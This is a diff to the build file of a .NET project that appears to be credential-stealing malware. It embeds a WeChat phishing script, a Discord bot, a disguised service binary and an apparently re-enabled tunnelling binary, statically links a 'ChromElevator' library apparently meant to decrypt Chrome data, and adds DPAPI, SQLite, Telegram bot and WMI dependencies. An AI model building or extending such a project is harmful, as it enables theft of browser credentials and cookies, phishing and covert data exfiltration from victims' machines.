@@ -51,17 +51,34 @@
     <EmbeddedResource Include="MsDiscordSvc.bin" />
     <EmbeddedResource Include="core\wechat_phish.py" />
     <EmbeddedResource Include="websocket\discord_bot.py" />
-    <!-- <EmbeddedResource Include="tools\bore.bin" /> -->
+    <EmbeddedResource Include="bore.bin" />
     <EmbeddedResource Include="e_sqlite3.dll" />
     <EmbeddedResource Include="GlobalLogger.py" />
   </ItemGroup>
   
+  <ItemGroup>
+    <!-- Native Linking for ChromElevator (Static) -->
+    <DirectPInvoke Include="chromelevator" />
+    <NativeLibrary Include="tools\chromelevator\chromelevator.lib" />
+    
+    <!-- Win32 Core Dependencies for C++ Integration -->
+    <NativeLibrary Include="bcrypt.lib" />
+    <NativeLibrary Include="ole32.lib" />
+    <NativeLibrary Include="oleaut32.lib" />
+    <NativeLibrary Include="shell32.lib" />
+    <NativeLibrary Include="version.lib" />
+    <NativeLibrary Include="crypt32.lib" />
+    <NativeLibrary Include="advapi32.lib" />
+    <NativeLibrary Include="user32.lib" />
+  </ItemGroup>
+
   <ItemGroup>
     <!-- Dependencies -->
     <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.0" />
     <PackageReference Include="Newtonsoft.Json" Version="13.0.3" />
     <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
     <PackageReference Include="Telegram.Bot" Version="19.0.0" />
+    <PackageReference Include="System.Management" Version="8.0.0" />
   </ItemGroup>
 
 </Project>
